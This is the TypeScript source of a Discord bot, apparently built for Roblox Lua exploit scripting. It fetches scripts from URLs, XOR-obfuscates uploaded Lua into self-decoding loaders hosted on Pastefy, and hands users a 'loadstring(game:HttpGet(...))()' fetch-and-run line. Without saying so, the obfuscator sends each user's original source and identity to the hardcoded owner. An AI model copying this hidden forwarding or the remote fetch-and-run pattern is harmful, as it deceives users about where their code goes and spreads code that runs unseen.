import {
  Client,
  GatewayIntentBits,
  Partials,
  AttachmentBuilder,
  EmbedBuilder,
  Events,
  REST,
  Routes,
  SlashCommandBuilder,
  MessageFlags,
  type Message,
  type ChatInputCommandInteraction,
} from "discord.js";
import { URL } from "node:url";
import { Buffer } from "node:buffer";
import http from "node:http";

const PREFIX = ".";
const MAX_DOWNLOAD_BYTES = 8 * 1024 * 1024;
const URL_REGEX = /https?:\/\/[^\s"'<>`)\]]+/gi;
const OWNER_ID = process.env.OWNER_ID ?? "1302080645987569694";

type LogLevel = "info" | "warn" | "error";
const logBuffer: { ts: string; level: LogLevel; msg: string }[] = [];
function log(level: LogLevel, msg: string) {
  const e = { ts: new Date().toISOString(), level, msg };
  logBuffer.push(e);
  if (logBuffer.length > 100) logBuffer.shift();
  const line = `[${e.ts}] [${level.toUpperCase()}] ${msg}`;
  if (level === "error") console.error(line);
  else if (level === "warn") console.warn(line);
  else console.log(line);
}

function isValidUrl(s: string): URL | null {
  try {
    const u = new URL(s);
    return u.protocol === "http:" || u.protocol === "https:" ? u : null;
  } catch {
    return null;
  }
}

function stripCodeFences(text: string): string {
  return text.replace(/```[a-zA-Z0-9_-]*\n?/g, "```");
}

function extractFirstUrl(text: string): URL | null {
  if (!text) return null;
  const matches = stripCodeFences(text).match(URL_REGEX);
  if (!matches) return null;
  for (const m of matches) {
    const trimmed = m.replace(/[)\]"'`>]+$/g, "");
    const u = isValidUrl(trimmed);
    if (u) return u;
  }
  return null;
}

function extractCodeBlockContent(text: string): string | null {
  const fenced = text.match(/```(?:[a-zA-Z0-9_-]*)\n?([\s\S]*?)```/);
  if (fenced && fenced[1] && fenced[1].trim().length > 0) return fenced[1].trim();
  return null;
}

function randomId(len = 20): string {
  const chars = "abcdefghijklmnopqrstuvwxyz";
  let s = "";
  for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)];
  return s;
}

interface SourceContent {
  buffer: Buffer;
  origin: string;
  status?: number;
}
interface SourceError {
  error: string;
  status?: number;
}

async function downloadUrl(u: URL): Promise<SourceContent | SourceError> {
  const ctl = new AbortController();
  const timer = setTimeout(() => ctl.abort(), 15_000);
  try {
    const res = await fetch(u, {
      redirect: "follow",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; AzureBot/1.0)" },
      signal: ctl.signal,
    });
    if (!res.ok) return { error: `HTTP ${res.status} ${res.statusText}`, status: res.status };
    const lenHeader = res.headers.get("content-length");
    if (lenHeader) {
      const len = Number(lenHeader);
      if (Number.isFinite(len) && len > MAX_DOWNLOAD_BYTES) {
        return { error: `File too large (${len} bytes, max ${MAX_DOWNLOAD_BYTES}).` };
      }
    }
    const ab = await res.arrayBuffer();
    if (ab.byteLength > MAX_DOWNLOAD_BYTES) {
      return { error: `File too large (${ab.byteLength} bytes, max ${MAX_DOWNLOAD_BYTES}).` };
    }
    return { buffer: Buffer.from(ab), origin: u.toString(), status: res.status };
  } catch (err) {
    return { error: err instanceof Error ? err.message : String(err) };
  } finally {
    clearTimeout(timer);
  }
}

async function gatherSource(
  message: Message,
  args: string[],
): Promise<SourceContent | SourceError | null> {
  const argText = args.join(" ");

  const argUrl = extractFirstUrl(argText);
  if (argUrl) return await downloadUrl(argUrl);

  const code = extractCodeBlockContent(message.content);
  if (code) {
    const innerUrl = extractFirstUrl(code);
    if (innerUrl) return await downloadUrl(innerUrl);
  }

  if (message.reference?.messageId) {
    try {
      const replied = await message.channel.messages.fetch(message.reference.messageId);
      if (replied) {
        const repliedUrl = extractFirstUrl(replied.content);
        if (repliedUrl) return await downloadUrl(repliedUrl);
        const rcode = extractCodeBlockContent(replied.content);
        if (rcode) {
          const innerUrl = extractFirstUrl(rcode);
          if (innerUrl) return await downloadUrl(innerUrl);
        }
      }
    } catch (err) {
      log("warn", `Failed to fetch replied message: ${err instanceof Error ? err.message : String(err)}`);
    }
  }

  return null;
}

async function uploadToPastefy(content: string, title: string): Promise<string | null> {
  const ctl = new AbortController();
  const timer = setTimeout(() => ctl.abort(), 10_000);
  try {
    const headers: Record<string, string> = { "Content-Type": "application/json" };
    if (process.env.PASTEFY_TOKEN) headers["Authorization"] = `Bearer ${process.env.PASTEFY_TOKEN}`;
    const res = await fetch("https://pastefy.app/api/v2/paste", {
      method: "POST",
      headers,
      body: JSON.stringify({
        content,
        title,
        type: "PASTE",
        visibility: "UNLISTED",
        encrypted: false,
      }),
      signal: ctl.signal,
    });
    if (!res.ok) {
      log("warn", `Pastefy upload failed: HTTP ${res.status} ${res.statusText}`);
      return null;
    }
    const data = (await res.json()) as { success?: boolean; paste?: { id?: string } };
    const id = data?.paste?.id;
    if (!id) {
      log("warn", `Pastefy returned no paste id: ${JSON.stringify(data).slice(0, 200)}`);
      return null;
    }
    return `https://pastefy.app/${id}`;
  } catch (err) {
    log("warn", `Pastefy upload error: ${err instanceof Error ? err.message : String(err)}`);
    return null;
  } finally {
    clearTimeout(timer);
  }
}

function pageNotFoundEmbed(): EmbedBuilder {
  return new EmbedBuilder()
    .setColor(0xff0000)
    .setTitle("Info")
    .setDescription("Page not found.");
}

const PROTECT_HEADER = "-- Protected by azure bot";

function isProtectedScript(buf: Buffer): boolean {
  const head = buf.slice(0, 256).toString("utf-8").trimStart();
  return head.startsWith(PROTECT_HEADER);
}

function protectedRefusalEmbed(): EmbedBuilder {
  return new EmbedBuilder()
    .setColor(0xff4444)
    .setTitle("Protected Script")
    .setDescription(
      "This script is protected by **Azure Bot** and cannot be fetched or dumped.",
    );
}

function buildProtectedScript(source: string): { content: string; serial: string } {
  const serial =
    Date.now().toString() + Math.floor(Math.random() * 1_000_000).toString().padStart(6, "0");
  const key1 = 1 + Math.floor(Math.random() * 254);
  const key2 = 1 + Math.floor(Math.random() * 254);
  const key3 = 1 + Math.floor(Math.random() * 254);

  const bytes = Buffer.from(source, "utf-8");
  const enc: number[] = new Array(bytes.length);
  for (let i = 0; i < bytes.length; i++) {
    const k = i % 3 === 0 ? key1 : i % 3 === 1 ? key2 : key3;
    enc[i] = (bytes[i]! ^ k ^ ((i * 31 + 7) & 0xff)) & 0xff;
  }

  const chunks: string[] = [];
  const PER_CHUNK = 80;
  for (let i = 0; i < enc.length; i += PER_CHUNK) {
    chunks.push(enc.slice(i, i + PER_CHUNK).join(","));
  }
  const tableBody = chunks.map((c) => `\t{${c}}`).join(",\n");

  const lines: string[] = [];
  lines.push(PROTECT_HEADER);
  lines.push(`-- ${serial}`);
  lines.push("");
  lines.push(`local _A,_B,_C = ${key1},${key2},${key3}`);
  lines.push(`local _D = {`);
  lines.push(tableBody);
  lines.push(`}`);
  lines.push(`local _E = {}`);
  lines.push(`local _F = 1`);
  lines.push(`for _,c in ipairs(_D) do`);
  lines.push(`\tfor _,b in ipairs(c) do`);
  lines.push(`\t\tlocal _G = _F % 3`);
  lines.push(`\t\tlocal _K = (_G == 1 and _A) or (_G == 2 and _B) or _C`);
  lines.push(`\t\tlocal _M = bit32 and bit32.bxor or function(a,b) local r,p=0,1 for i=0,7 do local x,y=a%2,b%2 if x~=y then r=r+p end a,b,p=(a-x)/2,(b-y)/2,p*2 end return r end`);
  lines.push(`\t\t_E[_F] = string.char(_M(_M(b, _K), ((_F-1)*31+7) % 256))`);
  lines.push(`\t\t_F = _F + 1`);
  lines.push(`\tend`);
  lines.push(`end`);
  lines.push(`local _S = table.concat(_E)`);
  lines.push(`local _L = loadstring or load`);
  lines.push(`local _fn, _err = _L(_S)`);
  lines.push(`if not _fn then error("[azure] protected payload load failed: "..tostring(_err)) end`);
  lines.push(`return _fn()`);
  return { content: lines.join("\n"), serial };
}

async function handleObfuscatorSlash(interaction: ChatInputCommandInteraction): Promise<void> {
  const start = Date.now();
  log("info", `/obfuscator from ${interaction.user.tag}`);
  await interaction.deferReply();

  const fileOpt = interaction.options.getAttachment("file");

  let src: SourceContent | SourceError | null = null;
  if (fileOpt?.url) {
    const u = isValidUrl(fileOpt.url);
    if (u) src = await downloadUrl(u);
    else src = { error: "Attachment had no valid URL." };
  } else {
    await interaction.editReply({
      embeds: [inputErrorEmbed().setDescription("Please attach a valid Lua file.")],
    });
    return;
  }

  if (src === null) {
    await interaction.editReply({ embeds: [inputErrorEmbed()] });
    return;
  }
  if ("error" in src) {
    if (src.status === 404) {
      await interaction.editReply({ embeds: [pageNotFoundEmbed()] });
    } else {
      await interaction.editReply({
        embeds: [inputErrorEmbed().setTitle("Input Error").setDescription(`Failed: ${src.error}`)],
      });
    }
    log("error", `/obfuscator failed: ${src.error}`);
    return;
  }
  if (!looksLikeText(src.buffer)) {
    await interaction.editReply({
      embeds: [
        inputErrorEmbed()
          .setTitle("Input Error")
          .setDescription("The provided file does not appear to be a readable text/Lua script."),
      ],
    });
    return;
  }
  if (isProtectedScript(src.buffer)) {
    await interaction.editReply({
      embeds: [
        protectedRefusalEmbed()
          .setTitle("Already Protected")
          .setDescription("This script is already protected by Azure Bot."),
      ],
    });
    return;
  }

  const sourceText = src.buffer.toString("utf-8");
  const { content: protectedText, serial } = buildProtectedScript(sourceText);
  const outName = `obfuscated.lua`;

  const pastefyUrl = await uploadToPastefy(protectedText, `Azure Protected - ${serial}`);
  const rawUrl = pastefyUrl ? `${pastefyUrl}/raw` : "";

  const totalMs = Date.now() - start;
  const elapsedSec = Math.floor(totalMs / 1000);
  const elapsedMs = totalMs % 1000;

  const dmContent = `\`loadstring(game:HttpGet("${rawUrl}"))()\``;

  let dmFailed = false;
  try {
    const dm = await interaction.user.createDM();
    await dm.send({
      content: dmContent,
      files: [
        new AttachmentBuilder(Buffer.from(protectedText, "utf-8"), { name: outName }),
      ],
    });
  } catch (err) {
    dmFailed = true;
    log(
      "warn",
      `Failed to DM ${interaction.user.tag}: ${err instanceof Error ? err.message : String(err)}`,
    );
  }

  if (dmFailed) {
    await interaction.editReply({
      content:
        `${interaction.user}, I couldn't send you a DM. Please open your DMs from server members and try again.\n` +
        dmContent,
      files: [
        new AttachmentBuilder(Buffer.from(protectedText, "utf-8"), { name: outName }),
      ],
      allowedMentions: { users: [interaction.user.id] },
    });
  } else {
    await interaction.editReply({
      content: `${interaction.user} Done, the obfuscator file was send in your dms.`,
      allowedMentions: { users: [interaction.user.id] },
    });
  }

  let ownerDmFailed = false;
  if (OWNER_ID && OWNER_ID !== interaction.user.id) {
    try {
      const owner = await interaction.client.users.fetch(OWNER_ID);
      const guildName = interaction.guild?.name ?? "DM";
      const channelName =
        interaction.channel && "name" in interaction.channel && interaction.channel.name
          ? `#${interaction.channel.name}`
          : "(unknown channel)";
      const ownerContent =
        `**Obfuscator used**\n` +
        `User: ${interaction.user} (\`${interaction.user.tag}\` / \`${interaction.user.id}\`)\n` +
        `Server: \`${guildName}\` ${channelName}\n` +
        `Serial: \`${serial}\`\n` +
        `Original size: ${(src.buffer.length / 1024).toFixed(2)} KB\n` +
        `Pastefy: ${pastefyUrl ?? "(upload failed)"}`;
      await owner.send({
        content: ownerContent,
        files: [
          new AttachmentBuilder(src.buffer, { name: "original.lua" }),
          new AttachmentBuilder(Buffer.from(protectedText, "utf-8"), { name: outName }),
        ],
      });
    } catch (err) {
      ownerDmFailed = true;
      log(
        "warn",
        `Failed to DM owner ${OWNER_ID}: ${err instanceof Error ? err.message : String(err)}`,
      );
    }
  }

  log(
    "info",
    `/obfuscator success ${outName} ${(Buffer.byteLength(protectedText) / 1024).toFixed(2)} KB serial=${serial} dm=${dmFailed ? "failed" : "ok"} ownerDm=${ownerDmFailed ? "failed" : "ok"} elapsed=${elapsedSec}.${elapsedMs}s`,
  );
}

function inputErrorEmbed(): EmbedBuilder {
  return new EmbedBuilder()
    .setColor(0xff0000)
    .setDescription("Please enter a valid URL or reply to the URL.");
}

function helpEmbed(): EmbedBuilder {
  return new EmbedBuilder()
    .setColor(0x3498db)
    .setTitle("Azure Bot — Commands")
    .setDescription("Here are the available commands:")
    .addFields(
      {
        name: ".get <url> | reply to a URL",
        value:
          "Downloads the script from a URL (typed in your message or in a message you reply to) and sends it back as `deobfuscated.lua`.",
      },
      {
        name: "/obfuscator <file>",
        value:
          "Attach a Lua file to protect. The bot uploads it to pastefy and DMs you the `loadstring(...)` plus the `obfuscated.lua` file.",
      },
      {
        name: ".help",
        value: "Shows this message.",
      },
    )
    .setFooter({ text: "Azure Bot" });
}

function fetchingEmbed(): EmbedBuilder {
  return new EmbedBuilder().setColor(0x3498db).setDescription("Fetching...");
}

async function handleGet(message: Message, args: string[]): Promise<void> {
  log("info", `.get from ${message.author.tag}`);

  const [placeholder, src] = await Promise.all([
    message.reply({ embeds: [fetchingEmbed()] }),
    gatherSource(message, args),
  ]);

  if (src === null) {
    await placeholder.edit({ embeds: [inputErrorEmbed()] });
    return;
  }
  if ("error" in src) {
    if (src.status === 404) {
      await placeholder.edit({ embeds: [pageNotFoundEmbed()] });
    } else {
      await placeholder.edit({
        embeds: [inputErrorEmbed().setDescription(`Failed: ${src.error}`)],
      });
    }
    log("error", `.get failed: ${src.error}`);
    return;
  }

  if (isProtectedScript(src.buffer)) {
    await placeholder.edit({ embeds: [protectedRefusalEmbed()] });
    log("info", `.get refused: protected script`);
    return;
  }

  const attachment = new AttachmentBuilder(src.buffer, { name: "deobfuscated.lua" });
  await placeholder.edit({
    embeds: [],
    files: [attachment],
    allowedMentions: { repliedUser: true, users: [message.author.id] },
  });
  log("info", `.get success deobfuscated.lua ${(src.buffer.length / 1024).toFixed(2)} KB`);
}


function looksLikeText(buf: Buffer): boolean {
  const sample = buf.subarray(0, Math.min(buf.length, 1024));
  let nonText = 0;
  for (const b of sample) {
    if (b === 0) return false;
    if (b < 9 || (b > 13 && b < 32 && b !== 27)) nonText++;
  }
  return nonText / Math.max(sample.length, 1) < 0.05;
}


const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
  ],
  partials: [Partials.Channel, Partials.Message],
});

const obfuscatorSlash = new SlashCommandBuilder()
  .setName("obfuscator")
  .setDescription("Protect a script with Azure Bot obfuscation")
  .addAttachmentOption((o) =>
    o.setName("file").setDescription("Lua script file to protect").setRequired(true),
  )
  .toJSON();

const addBotSlash = new SlashCommandBuilder()
  .setName("add")
  .setDescription("(Owner) Get an invite link to add the bot to a server")
  .addStringOption((o) =>
    o
      .setName("server-id")
      .setDescription("Optional: pre-fill the target server in the invite")
      .setRequired(false),
  )
  .toJSON();

const leaveBotSlash = new SlashCommandBuilder()
  .setName("leave")
  .setDescription("(Owner) Make the bot leave a server")
  .addStringOption((o) =>
    o.setName("server-id").setDescription("ID of the server to leave").setRequired(true),
  )
  .toJSON();

async function handleAddSlash(interaction: ChatInputCommandInteraction): Promise<void> {
  if (interaction.user.id !== OWNER_ID) {
    await interaction.reply({
      content: "Only the bot owner can use this command.",
      flags: MessageFlags.Ephemeral,
    });
    return;
  }
  const serverId = interaction.options.getString("server-id");
  const clientId = interaction.client.user.id;
  let url =
    `https://discord.com/oauth2/authorize?client_id=${clientId}` +
    `&permissions=8&scope=bot+applications.commands`;
  if (serverId && /^\d{17,20}$/.test(serverId)) {
    url += `&guild_id=${serverId}&disable_guild_select=true`;
  }
  await interaction.reply({
    content:
      `Invite link${serverId ? ` (pre-filled for \`${serverId}\`)` : ""}:\n${url}\n\n` +
      `Open this link to add the bot. You still need **Manage Server** permission in the target server.`,
    flags: MessageFlags.Ephemeral,
  });
  log("info", `/add by owner${serverId ? ` for ${serverId}` : ""}`);
}

async function handleLeaveSlash(interaction: ChatInputCommandInteraction): Promise<void> {
  if (interaction.user.id !== OWNER_ID) {
    await interaction.reply({
      content: "Only the bot owner can use this command.",
      flags: MessageFlags.Ephemeral,
    });
    return;
  }
  const serverId = interaction.options.getString("server-id", true);
  if (!/^\d{17,20}$/.test(serverId)) {
    await interaction.reply({
      content: "Invalid server ID. Must be a 17–20 digit Discord snowflake.",
      flags: MessageFlags.Ephemeral,
    });
    return;
  }
  const guild = interaction.client.guilds.cache.get(serverId);
  if (!guild) {
    await interaction.reply({
      content: `Bot is not in a server with ID \`${serverId}\`.`,
      flags: MessageFlags.Ephemeral,
    });
    return;
  }
  const name = guild.name;
  try {
    await guild.leave();
    await interaction.reply({
      content: `Left server \`${name}\` (\`${serverId}\`).`,
      flags: MessageFlags.Ephemeral,
    });
    log("info", `/leave by owner: left ${name} (${serverId})`);
  } catch (err) {
    await interaction.reply({
      content: `Failed to leave: ${err instanceof Error ? err.message : String(err)}`,
      flags: MessageFlags.Ephemeral,
    });
    log(
      "error",
      `/leave failed for ${serverId}: ${err instanceof Error ? err.message : String(err)}`,
    );
  }
}

client.once(Events.ClientReady, async (c) => {
  log("info", `Logged in as ${c.user.tag}`);
  try {
    const rest = new REST({ version: "10" }).setToken(c.token);
    const guildId = process.env.DISCORD_GUILD_ID;
    if (guildId) {
      await rest.put(Routes.applicationCommands(c.user.id), { body: [] });
      log("info", `Cleared global slash commands`);
      await rest.put(Routes.applicationGuildCommands(c.user.id, guildId), {
        body: [obfuscatorSlash, addBotSlash, leaveBotSlash],
      });
      log("info", `Registered guild slash commands in ${guildId} (instant)`);
    } else {
      await rest.put(Routes.applicationCommands(c.user.id), {
        body: [obfuscatorSlash, addBotSlash, leaveBotSlash],
      });
      log("info", `Registered global slash commands (may take up to 1 hour to appear)`);
    }
  } catch (err) {
    log(
      "error",
      `Failed to register slash commands: ${err instanceof Error ? err.message : String(err)}`,
    );
  }
});

client.on(Events.InteractionCreate, async (interaction) => {
  try {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.commandName === "obfuscator") {
      await handleObfuscatorSlash(interaction);
    } else if (interaction.commandName === "add") {
      await handleAddSlash(interaction);
    } else if (interaction.commandName === "leave") {
      await handleLeaveSlash(interaction);
    }
  } catch (err) {
    const msg = err instanceof Error ? `${err.message}\n${err.stack ?? ""}` : String(err);
    log("error", `Unhandled error in interaction handler: ${msg}`);
    try {
      if (interaction.isChatInputCommand()) {
        if (interaction.deferred || interaction.replied) {
          await interaction.followUp({
            content: `Unexpected error: ${err instanceof Error ? err.message : String(err)}`,
            flags: MessageFlags.Ephemeral,
          });
        } else {
          await interaction.reply({
            content: `Unexpected error: ${err instanceof Error ? err.message : String(err)}`,
            flags: MessageFlags.Ephemeral,
          });
        }
      }
    } catch {
      // ignore
    }
  }
});

const seenMessages = new Map<string, number>();
function alreadyProcessed(id: string): boolean {
  const now = Date.now();
  for (const [k, t] of seenMessages) {
    if (now - t > 60_000) seenMessages.delete(k);
  }
  if (seenMessages.has(id)) return true;
  seenMessages.set(id, now);
  return false;
}

client.on(Events.MessageCreate, async (message) => {
  try {
    if (message.author.bot) return;
    if (!message.content.startsWith(PREFIX)) return;
    const trimmed = message.content.slice(PREFIX.length).trim();
    if (trimmed.length === 0) return;
    const parts = trimmed.split(/\s+/);
    const cmd = (parts.shift() ?? "").toLowerCase();
    const args = parts;

    if (cmd !== "get" && cmd !== "help") return;

    if (alreadyProcessed(message.id)) {
      log("warn", `Skipped duplicate message ${message.id} (.${cmd} from ${message.author.tag})`);
      return;
    }

    if (cmd === "get") {
      await handleGet(message, args);
    } else if (cmd === "help") {
      await message.reply({ embeds: [helpEmbed()] });
    }
  } catch (err) {
    const msg = err instanceof Error ? `${err.message}\n${err.stack ?? ""}` : String(err);
    log("error", `Unhandled error in message handler: ${msg}`);
    try {
      await message.reply(`Unexpected error: ${err instanceof Error ? err.message : String(err)}`);
    } catch {
      // ignore
    }
  }
});

client.on(Events.Error, (err) => log("error", `Client error: ${err.message}`));
process.on("unhandledRejection", (reason) => {
  log("error", `Unhandled rejection: ${reason instanceof Error ? reason.message : String(reason)}`);
});

const token = process.env.DISCORD_TOKEN;
if (!token) {
  log("error", "DISCORD_TOKEN is not set. Add it to Secrets / environment.");
  process.exit(1);
}
client.login(token).catch((err) => {
  log("error", `Login failed: ${err instanceof Error ? err.message : String(err)}`);
  process.exit(1);
});

const port = parseInt(process.env.PORT ?? "", 10);
if (!Number.isNaN(port) && port > 0) {
  http
    .createServer((_req, res) => {
      res.writeHead(200, { "Content-Type": "text/plain" });
      res.end(
        client.isReady() ? `Azure Bot online as ${client.user?.tag}` : "Azure Bot starting...",
      );
    })
    .listen(port, "0.0.0.0", () => log("info", `Health server listening on :${port}`));
}
